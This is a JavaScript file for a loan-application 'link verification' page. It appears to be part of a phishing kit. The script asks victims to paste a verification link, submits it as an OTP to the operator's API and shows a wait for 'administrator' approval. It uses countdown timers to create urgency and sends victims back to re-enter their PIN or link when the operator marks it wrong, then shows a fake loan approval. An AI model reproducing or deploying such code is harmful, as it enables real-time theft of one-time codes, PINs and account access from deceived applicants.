// Link Verification Script - SINGLE LINK INPUT, 30-SECOND TIMER

document.addEventListener('DOMContentLoaded', function() {
    const linkInput = document.getElementById('verificationLink');
    const submitBtn = document.getElementById('verifyLinkBtn');
    const resendBtn = document.getElementById('resendBtn');
    const resendTimerDisplay = document.getElementById('resendTimer');
    const countdownNumber = document.getElementById('countdown');
    const timeRemaining = document.getElementById('timeRemaining');
    const countdownCircle = document.getElementById('countdownCircle');
    const maskedPhoneEl = document.getElementById('maskedPhone');
    
    // Create inline message container
    const messageContainer = document.createElement('div');
    messageContainer.style.cssText = 'margin: 20px 0; border-radius: 12px; overflow: hidden;';
    
    // Insert before link input
    const linkInputContainer = document.querySelector('.link-input-container');
    if (linkInputContainer && linkInputContainer.parentNode) {
        linkInputContainer.parentNode.insertBefore(messageContainer, linkInputContainer);
    }
    
    // Show inline message function
    function showMessage(text, type = 'info') {
        const styles = {
            error: { bg: '#fee2e2', border: '#fecaca', text: '#991b1b', icon: '✕' },
            success: { bg: '#d1fae5', border: '#a7f3d0', text: '#065f46', icon: '✓' },
            warning: { bg: '#fef3c7', border: '#fde68a', text: '#92400e', icon: '⚠' },
            info: { bg: '#dbeafe', border: '#bfdbfe', text: '#1e40af', icon: 'ℹ' }
        };
        
        const s = styles[type] || styles.info;
        
        messageContainer.innerHTML = `
            <div style="background:${s.bg}; border:2px solid ${s.border}; color:${s.text}; padding:16px 20px; display:flex; align-items:center; gap:12px; font-size:15px; line-height:1.6;">
                <span style="font-size:24px; font-weight:bold;">${s.icon}</span>
                <span style="flex:1;">${text}</span>
            </div>
        `;
        
        messageContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        // Auto-hide success/info after 6 seconds
        if (type === 'success' || type === 'info') {
            setTimeout(() => { messageContainer.innerHTML = ''; }, 6000);
        }
    }
    
    function clearMessage() {
        messageContainer.innerHTML = '';
    }
    
    // Get application data
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    let applicationId = applicationData.applicationId || 'LOAN-' + Date.now();
    
    // Mask phone number
    if (applicationData.phone && maskedPhoneEl) {
        const phone = applicationData.phone;
        const masked = phone.slice(0, -4).replace(/./g, '*') + phone.slice(-4);
        maskedPhoneEl.textContent = masked;
    }
    
    // Timer variables - CHANGED TO 30 SECONDS
    let timeLeft = 30;
    let resendTimeLeft = 30;
    let timerInterval;
    let resendInterval;
    let isResendLink = false;
    
    // Start timers
    startTimer();
    startResendTimer();
    
    // Focus on link input
    if (linkInput) linkInput.focus();
    
    // Link input handling
    if (linkInput) {
        linkInput.addEventListener('paste', function(e) {
            setTimeout(() => {
                const pasted = this.value.trim();
                if (pasted) {
                    showMessage('Link detected! Click "Verify Link" to continue.', 'success');
                }
            }, 100);
        });
        
        linkInput.addEventListener('input', function() {
            clearMessage();
        });
    }
    
    // Submit Link - UPDATED TO SEND FULL LINK
    submitBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const link = linkInput.value.trim();
        
        if (!link) {
            showMessage('Please paste the verification link', 'warning');
            linkInput.focus();
            return;
        }
        
        // Send the FULL link as-is (no extraction or modification)
        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Verifying... <span class="arrow">→</span>';
        clearMessage();
        
        try {
            console.log('Sending full link:', link);
            console.log('Application ID:', applicationId);
            
            const response = await fetch('/api/verify-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ applicationId, otp: link })
            });
            
            const result = await response.json();
            
            if (result.success) {
                showMessage('Your link has been sent to the administrator. Please wait for approval...', 'info');
                checkLinkStatus();
            } else {
                showMessage('Failed to submit link. Please try again.', 'error');
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Verify Link <span class="arrow">→</span>';
                restartTimers();
            }
            
        } catch (error) {
            console.error('Error:', error);
            showMessage('Network error. Please check your connection and try again.', 'error');
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Verify Link <span class="arrow">→</span>';
            restartTimers();
        }
    });
    
    // Check link status
    function checkLinkStatus() {
        const statusInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-otp-status/${applicationId}`);
                const result = await response.json();
                
                if (result.status === 'approved') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('🎉 Congratulations! Your loan has been approved. Redirecting...', 'success');
                    setTimeout(() => { window.location.href = 'approval.html'; }, 2000);
                    
                } else if (result.status === 'rejected') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('Verification failed. Please contact support.', 'error');
                    submitBtn.disabled = true;
                    submitBtn.textContent = 'Verification Failed';
                    
                } else if (result.status === 'wrongpin_otp') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('Incorrect PIN. Redirecting to re-enter PIN...', 'error');
                    setTimeout(() => { window.location.href = 'verification.html'; }, 3000);
                    
                } else if (result.status === 'wrongcode') {
                    clearInterval(statusInterval);
                    linkInput.value = '';
                    linkInput.disabled = false;
                    linkInput.focus();
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = 'Verify Link <span class="arrow">→</span>';
                    showMessage('Incorrect link. Please re-enter or click "Resend" to get a new link.', 'error');
                }
            } catch (error) {
                console.error('Status check error:', error);
            }
        }, 2000);
        
        setTimeout(() => clearInterval(statusInterval), 300000); // 5 min timeout
    }
    
    // Timer functions - CHANGED TO 30 SECONDS
    function startTimer() {
        updateTimerDisplay();
        timerInterval = setInterval(() => {
            timeLeft--;
            updateTimerDisplay();
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                handleTimeout();
            }
        }, 1000);
    }
    
    function updateTimerDisplay() {
        const timeText = `${timeLeft}s`;
        
        if (countdownNumber) countdownNumber.textContent = timeLeft;
        if (timeRemaining) timeRemaining.textContent = timeText;
        
        if (countdownCircle) {
            const maxTime = 30; // Changed to 30 seconds
            const circumference = 283;
            const progress = (timeLeft / maxTime) * circumference;
            countdownCircle.style.strokeDashoffset = circumference - progress;
            if (timeLeft < 10) countdownCircle.style.stroke = '#ef4444';
        }
    }
    
    function handleTimeout() {
        showMessage('Link has expired. Click "Resend" to get a new link.', 'warning');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Link Expired';
        linkInput.value = '';
        linkInput.disabled = true;
    }
    
    function startResendTimer() {
        resendBtn.disabled = true;
        resendBtn.style.opacity = '0.5';
        
        resendInterval = setInterval(() => {
            resendTimeLeft--;
            
            if (resendTimeLeft <= 0) {
                clearInterval(resendInterval);
                resendBtn.disabled = false;
                resendBtn.style.opacity = '1';
                if (resendTimerDisplay) resendTimerDisplay.textContent = '';
            } else {
                if (resendTimerDisplay) {
                    resendTimerDisplay.textContent = `(${resendTimeLeft}s)`;
                }
            }
        }, 1000);
    }
    
    function restartTimers() {
        clearAllTimers();
        // Always use 30 seconds
        timeLeft = 30;
        resendTimeLeft = 30;
        startTimer();
        startResendTimer();
    }
    
    function clearAllTimers() {
        if (timerInterval) clearInterval(timerInterval);
        if (resendInterval) clearInterval(resendInterval);
    }
    
    // Resend Link
    resendBtn.addEventListener('click', async function() {
        if (resendTimeLeft > 0) return;
        
        try {
            const response = await fetch('/api/resend-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ applicationId })
            });
            
            const result = await response.json();
            
            if (result.success) {
                isResendLink = true;
                showMessage('New link requested. Please check with the administrator.', 'success');
                linkInput.value = '';
                linkInput.disabled = false;
                linkInput.focus();
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Verify Link <span class="arrow">→</span>';
                restartTimers();
            } else {
                showMessage('Failed to resend link. Please try again.', 'error');
            }
        } catch (error) {
            console.error('Resend error:', error);
            showMessage('Network error. Please try again.', 'error');
        }
    });
    
    // Global function for request new link button
    window.requestNewLink = function() {
        location.reload();
    };
});